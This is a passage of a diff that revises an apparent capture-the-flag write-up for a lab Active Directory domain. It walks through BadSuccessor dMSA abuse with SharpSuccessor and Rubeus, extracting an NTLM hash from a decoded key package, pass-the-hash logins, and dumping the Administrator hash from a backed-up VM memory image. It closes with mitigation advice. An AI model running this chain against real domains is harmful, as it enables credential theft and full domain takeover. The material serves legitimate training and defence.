-.\SharpSuccessor.exe add /impersonate:svc_deploy /path:"OU=DMSAHolder,DC=checkpoint,DC=htb" /account:ryan.brooks /name:attacker_dmsa
+PS C:\temp > Import-Module .\PowerView.ps1
+PS C:\temp > Get-DomainObjectAcl -Identity "OU=DMSAHolder,DC=checkpoint,DC=htb" -ResolveGUIDs
 ```
 
 ```text
+AceType               : AccessAllowed
+ObjectDN              : OU=DMSAHolder,DC=checkpoint,DC=htb
+ActiveDirectoryRights : CreateChild
+OpaqueLength          : 0
+ObjectSID             :
+InheritanceFlags      : ContainerInherit
+BinaryLength          : 36
+IsInherited           : False
+IsCallback            : False
+PropagationFlags      : None
+SecurityIdentifier    : S-1-5-21-3129162710-3498938529-1807524340-1103
+AccessMask            : 1
+AuditFlags            : None
+AceFlags              : ContainerInherit
+AceQualifier          : AccessAllowed
+```
+
+`ryan.brooks` (`S-1-5-21-3129162710-3498938529-1807524340-1103`) has `CreateChild` on `OU=DMSAHolder`!
+
+---
+
+### Weaponizing dMSA with SharpSuccessor
+
+Here is our complete attack path:
+
+```text
+[ryan.brooks]
+      │
+      ├──> [CreateChild on OU=DMSAHolder]
+      │          │
+      │          ▼
+      │    [Create attacker-controlled dMSA: attacker_dmsa]
+      │
+      └──> [GenericWrite on svc_deploy]
+                 │
+                 ▼
+ [Write mutual pairing attributes on both sides]
+      │
+      ├──> [dMSA object: msDS-GroupMSAMembership]
+      │                  msDS-ManagedAccountPrecededByLink  --> points to svc_deploy
+      │
+      └──> [svc_deploy object: msDS-SupersededManagedAccountLink] --> points to attacker_dmsa
+                               msDS-SupersededServiceAccountState = 2
+      │
+      ▼
+ [DC validates mutual pairing]
+      │
+      ▼
+ [Request TGS for dMSA]
+      │
+      ▼
+ [Expose and extract superseded NTLM hash via ASN.1 DER key package]
+```
+
+We execute `SharpSuccessor.exe` to configure both sides of the mutual link:
+
+```powershell
+PS C:\Temp> .\SharpSuccessor.exe add /impersonate:svc_deploy /path:"OU=DMSAHolder,DC=checkpoint,DC=htb" /account:ryan.brooks /name:attacker_dmsa
+```
+
+```text
+   _____ _                      _____
+  / ____| |                    / ____|
+ | (___ | |__   __ _ _ __ _ __| (___  _   _  ___ ___ ___  ___ ___  ___  _ __
+  \___ \| '_ \ / _` | '__| '_ \\___ \| | | |/ __/ __/ _ \/ __/ __|/ _ \| '__|
+  ____) | | | | (_| | |  | |_) |___) | |_| | (__ (__  __/\__ \__ \ (_) | |
+ |_____/|_| |_|\__,_|_|  | .__/_____/ \__,_|\___\___\___||___/___/\___/|_|
+                         | |
+                         |_|
+@_logangoins
+
 [+] Adding dnshostname attacker_dmsa.checkpoint.htb
 [+] Adding samaccountname attacker_dmsa$
 [+] svc_deploy's DN identified
 [+] Attempting to write msDS-ManagedAccountPrecededByLink
 [+] Wrote attribute successfully
 [+] Attempting to write msDS-DelegatedMSAState attribute
+[+] Attempting to set access rights on the dMSA object
+[+] Attempting to write msDS-SupportedEncryptionTypes attribute
+[+] Attempting to write userAccountControl attribute
 [+] Created dMSA object 'CN=attacker_dmsa' in 'OU=DMSAHolder,DC=checkpoint,DC=htb'
+[+] Successfully weaponized dMSA object
+[+] Found target account, attempting to write attributes
 [+] CN=attacker_dmsa,OU=DMSAHolder,DC=checkpoint,DC=htb written to svc_deploy object
 [+] msDS-SupersededServiceAccountState set to 2
-[+] Wrote to target account successfully
+[+] Wrote to target account successfully 
 ```
 
-### Requesting dMSA-Backed Kerberos TGS & Impersonating svc_deploy
+Both attributes have been written and the accounts are mutually linked!
 
-- 🔍 *Now that the accounts are paired, we extract Ryan's TGT via Rubeus and request a dMSA-backed TGS for `krbtgt`:*
+---
+
+### Requesting dMSA-Backed TGS & Secret Extraction
+
+Now we need a TGT for the current user (`ryan.brooks`) to present in the dMSA TGS request:
 
 ```powershell
 $t = .\Rubeus.exe tgtdeleg /nowrap | Out-String
 $b64 = ($t -split 'base64\(ticket.kirbi\):')[1] -replace '\s+',''
 [IO.File]::WriteAllBytes('C:\Temp\ryan_tgt.kirbi',[Convert]::FromBase64String($b64))
+```
 
-.\Rubeus.exe asktgs /targetuser:attacker_dmsa$ /service:krbtgt/checkpoint.htb /opsec /dmsa /nowrap /ptt /ticket:C:\Temp\ryan_tgt.kirbi
+Now we request a service ticket (`asktgs`) for `attacker_dmsa$` with the `/dmsa` and `/debug` flags:
+
+```powershell
+PS C:\Temp> .\Rubeus.exe asktgs /targetuser:attacker_dmsa$ /service:krbtgt/checkpoint.htb /opsec /dmsa /nowrap /debug /ticket:C:\Temp\ryan_tgt.kirbi
 ```
 
 ```text
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|\____/|____/|_____)\____/(___/
+
+  v2.3.3
+
 [*] Action: Ask TGS
+[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
 [*] Building DMSA TGS-REQ request for 'attacker_dmsa$' from 'ryan.brooks'
+[+] Sequence number is: 884855162
+[*] Using domain controller: DC01.checkpoint.htb (fe80::b1a3:9287:d9bc:fa42%5)
 [+] TGS request successful!
-[+] Ticket successfully imported!
+
+[DECODE] True MIGqoGMwYTApoAMCARKhIgQg78pLcBCGNV+aK0osJCU57dGxRmV7tpdRF9lHcVhj+O8wGaADAgERoRIEEFIlv7X+ytj1QAh9kVAgrKkwGaADAgEXoRIEEJaX1xD7q3UBeFiaH38bWZehHTAbMBmgAwIBF6ESBBDhYIHrB3rKdL2/ivEq9DrJohEYDzE2MDEwMTMwMTgxNjQ0WqQRGA8xNjAxMDEzMDE4MjE0NFo=
 ```
 
-- 🔍 *The PAC inside our imported Kerberos ticket now reflects the privileges and group memberships of **svc_deploy**!*
-- 🔍 *Inspecting token groups reveals membership in **CHECKPOINT\BackupAccess**:*
+The debug output exposes the base64-encoded dMSA key package containing both current and superseded keys.
 
-```text
-CHECKPOINT\BackupAccess  Group  S-1-5-21-3129162710-3498938529-1807524340-1123  Mandatory group
-```
+---
 
-### Accessing VMBackups Share & Memory Forensics Analysis
+### Decoding the ASN.1 DER Key Structure
 
-- 🔍 *As `svc_deploy`, we enumerate shares and discover read permissions on **VMBackups**:*
+On our attack machine, let's decode the base64 string into binary DER format:
 
 ```bash
-smbclient //checkpoint.htb/VMBackups -k --no-pass
+cat > dmsa_keypkg.b64 <<'EOF'
+MIGqoGMwYTApoAMCARKhIgQg78pLcBCGNV+aK0osJCU57dGxRmV7tpdRF9lHcVhj+O8wGaADAgERoRIEEFIlv7X+ytj1QAh9kVAgrKkwGaADAgEXoRIEEJaX1xD7q3UBeFiaH38bWZehHTAbMBmgAwIBF6ESBBDhYIHrB3rKdL2/ivEq9DrJohEYDzE2MDEwMTMwMTgxNjQ0WqQRGA8xNjAxMDEzMDE4MjE0NFo=
+EOF
+
+base64 -d dmsa_keypkg.b64 > dmsa_keypkg.der
+```
+
+Now we parse the ASN.1 structure with OpenSSL:
+
+```bash
+openssl asn1parse -inform DER -in dmsa_keypkg.der
 ```
 
 ```text
-smb: \> ls
-  NightlyBackup_2024-11-01            D        0  Thu Nov  1 02:00:00 2024
-smb: \> cd NightlyBackup_2024-11-01\memory forensics
-smb: \NightlyBackup_2024-11-01\memory forensics\> ls
-  Windows Server 2019-Snapshot1.vmem  A 4294967296  Thu Nov  1 02:05:00 2024
+    0:d=0  hl=3 l= 170 cons: SEQUENCE
+    3:d=1  hl=2 l=  99 cons: cont [ 0 ]
+    5:d=2  hl=2 l=  97 cons: SEQUENCE
+    7:d=3  hl=2 l=  41 cons: SEQUENCE
+    9:d=4  hl=2 l=   3 cons: cont [ 0 ]
+   11:d=5  hl=2 l=   1 prim: INTEGER           :12
+   14:d=4  hl=2 l=  34 cons: cont [ 1 ]
+   16:d=5  hl=2 l=  32 prim: OCTET STRING      [HEX DUMP]:EFCA4B701086355F9A2B4A2C242539EDD1B146657BB6975117D947715863F8EF
+   50:d=3  hl=2 l=  25 cons: SEQUENCE
+   52:d=4  hl=2 l=   3 cons: cont [ 0 ]
+   54:d=5  hl=2 l=   1 prim: INTEGER           :11
+   57:d=4  hl=2 l=  18 cons: cont [ 1 ]
+   59:d=5  hl=2 l=  16 prim: OCTET STRING      [HEX DUMP]:5225BFB5FECAD8F540087D915020ACA9
+   77:d=3  hl=2 l=  25 cons: SEQUENCE
+   79:d=4  hl=2 l=   3 cons: cont [ 0 ]
+   81:d=5  hl=2 l=   1 prim: INTEGER           :17
+   84:d=4  hl=2 l=  18 cons: cont [ 1 ]
+   86:d=5  hl=2 l=  16 prim: OCTET STRING      [HEX DUMP]:9697D710FBAB750178589A1F7F1B5997
+  104:d=1  hl=2 l=  29 cons: cont [ 1 ]
+  106:d=2  hl=2 l=  27 cons: SEQUENCE
+  108:d=3  hl=2 l=  25 cons: SEQUENCE
+  110:d=4  hl=2 l=   3 cons: cont [ 0 ]
+  112:d=5  hl=2 l=   1 prim: INTEGER           :17
+  115:d=4  hl=2 l=  18 cons: cont [ 1 ]
+  117:d=5  hl=2 l=  16 prim: OCTET STRING      [HEX DUMP]:E16081EB077ACA74BDBF8AF12AF43AC9
+  135:d=1  hl=2 l=  17 cons: cont [ 2 ]
+  137:d=2  hl=2 l=  15 prim: GENERALIZEDTIME   :16010130181644Z
+  154:d=1  hl=2 l=  17 cons: cont [ 4 ]
+  156:d=2  hl=2 l=  15 prim: GENERALIZEDTIME   :16010130182144Z
 ```
 
-- 🔍 *We download `Windows Server 2019-Snapshot1.vmem` to our attack workstation for offline memory forensics.*
-- 🔍 *Using **Volatility 3**, we analyze the memory dump to verify the Windows profile:*
+Inspecting the four OCTET strings:
+- Current AES-256: `EFCA4B701086355F9A2B4A2C242539EDD1B146657BB6975117D947715863F8EF`
+- Current Keys: `5225BFB5FECAD8F540087D915020ACA9`, `9697D710FBAB750178589A1F7F1B5997`
+- **Previous Key (superseded account NTLM hash):** **`E16081EB077ACA74BDBF8AF12AF43AC9`**
+
+The previous key is the NTLM hash of `svc_deploy`!
+
+---
+
+### Authenticating as `svc_deploy`
+
+We use Evil-WinRM with the extracted NTLM hash:
+
+```bash
+evil-winrm -i DC01.checkpoint.htb -u 'svc_deploy' -H E16081EB077ACA74BDBF8AF12AF43AC9
+```
+
+```text
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents> whoami /groups
+```
+
+```text
+GROUP INFORMATION
+-----------------
+
+Group Name                                  Type             SID                                            Attributes
+=========================================== ================ ============================================== ==================================================
+Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
+CHECKPOINT\BackupAccess                     Group            S-1-5-21-3129162710-3498938529-1807524340-1123 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
+```
+
+Notice that `svc_deploy` is an active member of **`CHECKPOINT\BackupAccess`**!
+
+---
+
+## Step 4 - Domain Compromise (Memory Forensics)
+
+### Accessing `VMBackups` Share
+
+Now let's check SMB share permissions with `svc_deploy`'s hash:
+
+```bash
+nxc smb checkpoint.htb -u 'svc_deploy' -H E16081EB077ACA74BDBF8AF12AF43AC9 --shares
+```
+
+```text
+SMB         10.129.78.103   445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
+SMB         10.129.78.103   445    DC01             [+] checkpoint.htb\svc_deploy:E16081EB077ACA74BDBF8AF12AF43AC9
+SMB         10.129.78.103   445    DC01             [*] Enumerated shares
+SMB         10.129.78.103   445    DC01             Share           Permissions            Remark
+SMB         10.129.78.103   445    DC01             -----           -----------            ------
+SMB         10.129.78.103   445    DC01             ADMIN$                                 Remote Admin
+SMB         10.129.78.103   445    DC01             C$                                     Default share
+SMB         10.129.78.103   445    DC01             DevDrop                                VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
+SMB         10.129.78.103   445    DC01             IPC$            READ                   Remote IPC
+SMB         10.129.78.103   445    DC01             NETLOGON        READ                   Logon server share 
+SMB         10.129.78.103   445    DC01             SYSVOL          READ                   Logon server share 
+SMB         10.129.78.103   445    DC01             VMBackups       READ                
+```
+
+`VMBackups` is readable! Let's connect using Impacket's `smbclient.py`:
+
+```bash
+smbclient.py -hashes :E16081EB077ACA74BDBF8AF12AF43AC9 'checkpoint.htb/svc_deploy@checkpoint.htb'
+```
+
+```text
+# use VMBackups
+# tree .
+/NightlyBackup_2024-11-01/memory forensics
+/NightlyBackup_2024-11-01/memory forensics/Windows Server 2019-000001.vmdk
+/NightlyBackup_2024-11-01/memory forensics/Windows Server 2019-Snapshot1.vmem
+/NightlyBackup_2024-11-01/memory forensics/Windows Server 2019-Snapshot1.vmsn
+/NightlyBackup_2024-11-01/memory forensics/Windows Server 2019.nvram
+/NightlyBackup_2024-11-01/memory forensics/Windows Server 2019.scoreboard
+/NightlyBackup_2024-11-01/memory forensics/Windows Server 2019.vmdk
+/NightlyBackup_2024-11-01/memory forensics/Windows Server 2019.vmsd
+/NightlyBackup_2024-11-01/memory forensics/Windows Server 2019.vmx
+/NightlyBackup_2024-11-01/memory forensics/Windows Server 2019.vmxf
+Finished - 11 files and folders
+
+# cd "/NightlyBackup_2024-11-01/memory forensics"
+# get "Windows Server 2019-Snapshot1.vmem"
+```
+
+The share stores a full VMware virtual machine backup snapshot, including physical RAM: **`Windows Server 2019-Snapshot1.vmem`**.
+
+---
+
+### Memory Forensics with Volatility 3
+
+The `.vmem` file is a raw memory dump containing kernel state, LSASS memory, and registry hives.
+
+Let's inspect the memory image profile using Volatility 3:
 
 ```bash
 vol -f "Windows Server 2019-Snapshot1.vmem" windows.info
@@ -276,18 +850,34 @@ vol -f "Windows Server 2019-Snapshot1.vmem" windows.info
 
 ```text
 Volatility 3 Framework 2.28.0
-Variable    Value
-Kernel Base 0xf80725608000
-DTB         0x1ad000
-Symbols     file:///home/kali/.cache/volatility3/symbols/windows/ntkrnlmp.pdb/...
-NtSystemRoot C:\Windows
-NtProductType NtProductServer
-Major/Minor 15.17763
+WARNING  volatility3.framework.layers.vmware: No metadata file found alongside VMEM file. A VMSS or VMSN file may be required to correctly process a VMEM file.
+Progress:  100.00		PDB scanning finished
+Variable	Value
+Kernel Base	0xf80725608000
+DTB	0x1ad000
+Symbols	file:///home/fsociety/.cache/volatility3/symbols/windows/ntkrnlmp.pdb/EF9A48AFA50FF07C616585BB01919536-1.json.xz
+Is64Bit	True
+IsPAE	False
+layer_name	0 WindowsIntel32e
+memory_layer	1 FileLayer
+KdVersionBlock	0xf80725a08f10
+Major/Minor	15.17763
+MachineType	34404
+KeNumberProcessors	2
+SystemTime	2026-05-09 14:08:58+00:00
+NtSystemRoot	C:\Windows
+NtProductType	NtProductServer
+NtMajorVersion	10
+NtMinorVersion	0
+PE MajorOperatingSystemVersion	10
+PE MinorOperatingSystemVersion	0
+PE Machine	34404
+PE TimeDateStamp	Sun Nov 10 07:20:39 2075
 ```
 
-### Volatility 3 Memory Forensics & Administrator SAM Hashdump
+Volatility successfully identified the memory image as Windows Server 2019 Build 17763.
 
-- 🔍 *We dump the local SAM registry hashes directly from the memory snapshot:*
+Now let's dump the cached SAM registry hashes from memory:
 
 ```bash
 vol -f "Windows Server 2019-Snapshot1.vmem" windows.registry.hashdump
@@ -295,41 +885,71 @@ vol -f "Windows Server 2019-Snapshot1.vmem" windows.registry.hashdump
 
 ```text
 Volatility 3 Framework 2.28.0
-User              rid  lmhash                           nthash
-Administrator     500  aad3b435b51404eeaad3b435b51404ee  f29e9c014295b9b32139b09a2790be3b
-Guest             501  aad3b435b51404eeaad3b435b51404ee  31d6cfe0d16ae931b73c59d7e0c089c0
-DefaultAccount    503  aad3b435b51404eeaad3b435b51404ee  31d6cfe0d16ae931b73c59d7e0c089c0
+Progress:  100.00        PDB scanning finished
+User    rid lmhash  nthash
+
+Administrator    500 aad3b435b51404eeaad3b435b51404ee    f29e9c014295b9b32139b09a2790be3b
+Guest    501 aad3b435b51404eeaad3b435b51404ee    31d6cfe0d16ae931b73c59d7e0c089c0
+DefaultAccount    503 aad3b435b51404eeaad3b435b51404ee    31d6cfe0d16ae931b73c59d7e0c089c0
+WDAGUtilityAccount    504 aad3b435b51404eeaad3b435b51404ee    28f8d934dee90b2ec824351cb0844479
 ```
 
-- 🔍 *We recovered the Domain Administrator NTLM hash: `f29e9c014295b9b32139b09a2790be3b`!*
+We extracted the Administrator's NT hash:
+```text
+f29e9c014295b9b32139b09a2790be3b
+```
 
-### Evil-WinRM Pass-the-Hash & Full Domain Takeover
+---
 
-- 🔍 *We connect to the Domain Controller as Administrator via Evil-WinRM using Pass-the-Hash:*
+### Root Access & Domain Compromise
+
+We connect to the Domain Controller via WinRM as Administrator:
 
 ```bash
 evil-winrm -i checkpoint.htb -u Administrator -H f29e9c014295b9b32139b09a2790be3b
 ```
 
 ```text
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+checkpoint\administrator
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> ls C:\Users
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         5/25/2026   6:26 PM                Administrator
+d-----         5/25/2026   6:34 PM                max.palmer
+d-r---          5/9/2026  12:30 AM                Public
+d-----         5/21/2026   4:19 PM                ryan.brooks
+d-----         6/14/2026   2:20 PM                svc_deploy
+
 *Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\max.palmer\Desktop\root.txt
-b841a029...
+b****************************4
 ```
 
-- 🔍 *Domain Controller fully compromised!*
+Domain fully compromised and root flag captured!
+
+> 🎯 **Final Takeaways & Real Talk:**  
+> Checkpoint is a phenomenal box that showcases real-world, cutting-edge Active Directory security concepts introduced in Windows Server 2025! The journey begins with active tombstone object reanimation via BloodyAD, moves into developer environment abuse via weaponized Visual Studio Code extensions (.vsix), navigates the failure of traditional PKINIT shadow credentials, and dives deep into the internal mechanics of Delegated Managed Service Accounts (dMSA) and BadSuccessor mutual pairing. Dumping ASN.1 DER key packages with OpenSSL to recover legacy service account hashes and concluding with hypervisor memory forensics using Volatility 3 makes this one of the most comprehensive Windows AD writeups. Happy Hacking!
 
 ---
 
-## Mitigations & Security Perspective
+## Step 5 - Mitigations & Defensive Hardening
 
-### 🔴 Unrestricted Extension Deployment via SMB (DevDrop)
-- **Root Cause:** A network share with write permissions for standard or unauthenticated users allowed automated processing and execution of unverified `.vsix` extension packages by the VS Code backend engine.
-- **Remediation:** Remove public write access to development drop shares. Implement digital signature validation and strict extension allowlists before loading extensions into enterprise IDE environments.
+To remediate the vulnerabilities identified across the Checkpoint Active Directory environment, administrators should apply defense-in-depth hardening across directory permissions, developer workstations, and backup infrastructure:
 
-### 🔴 Insecure GenericWrite on Service Accounts & dMSA CreateChild Rights
-- **Root Cause:** Standard domain users possessed `GenericWrite` permissions over critical service accounts (`svc_deploy`) and `CreateChild` rights on the `OU=DMSAHolder` container, enabling rogue dMSA mutual pairing attacks.
-- **Remediation:** Audit Active Directory Access Control Lists (ACLs). Apply the principle of least privilege, preventing standard tier-2 accounts from modifying service account attributes or creating objects in migration containers.
+### 1. Active Directory Deleted Objects Container Security & Tombstone Hardening
+- **Restrict Access to Deleted Objects Container:** Non-administrative accounts should never possess `WRITE` or `GENERIC_WRITE` permissions over `CN=Deleted Objects,DC=checkpoint,DC=htb` or individual tombstoned objects. Enforce strict DACL inheritance blocking on tombstoned objects.
+- **Enforce Password Expiry on Account Deletion / Restoration:** When an Active Directory object is deleted or tombstoned, strip all credentials and reset the account's password. Ensure that upon reanimation, the account is marked disabled by default (`userAccountControl` flag `ACCOUNTDISABLE = 0x0002`).
 
-### 🔴 Sensitive VM Memory Snapshots Exposed in Network Shares
-- **Root Cause:** Nightly backup shares contained complete VMware virtual machine memory dumps (`.vmem` and `.vmsn`) containing plaintext memory artifacts, LSASS secrets, and registry hives.
-- **Remediation:** Restrict backup share access strictly to dedicated backup operators. Store virtual machine snapshots and disk images on encrypted, isolated storage segments.
+### 2. SMB Share Access Control & Extension Package Validation (DevDrop)
+- **Implement Package Signing Verification:** Automated VS Code extension installation mechanisms must strictly verify cryptographic code-signing certificates before deploying `.vsix` packages to workstations. Disallow unsigned or self-signed extensions.
+- **Restrict Drop Share Permissions:** Replace shared write access on developer shares with an authenticated web interface or CI/CD pipeline requiring peer review before extensions are staged for installation.
+
+### 3. Windows Server 2025 dMSA Security & Delegation Boundaries
+- **Strictly Control OU=DMSAHolder Permissions:** Only Domain Admins or dedicated Tier 0 administrators should possess `CreateChild` rights on OUs designated for Delegated Managed Service Accounts (`msDS-DelegatedManagedServiceAccount`).
+- **Audit GenericWrite Delegations:** Remove `GenericWrite` or `WriteDacl` permissions granted to standard domain accounts (like `ryan.brooks`) over service accounts (`svc_deploy`). Service accounts should reside in protected OUs with administration strictly restricted to dedicated Tier 1 personnel.
+
+### 4. Hypervisor Backup & Memory Snapshot Protection
+- **Encrypt and Restrict VM Backup Storage:** Virtual machine memory dumps (`.vmem`), snapshot metadata (`.vmsn`), and virtual disks (`.vmdk`) contain raw memory artifacts including cached credentials and registry hives. These shares must never be accessible over standard SMB without multi-factor authorization and storage encryption.
+- **Enforce LSASS Credential Guard:** Enable Windows Defender Credential Guard via Group Policy to isolate LSASS secrets within a Virtualization-Based Security (VBS) sandbox, preventing plaintext credential extraction even if memory snapshots are obtained.
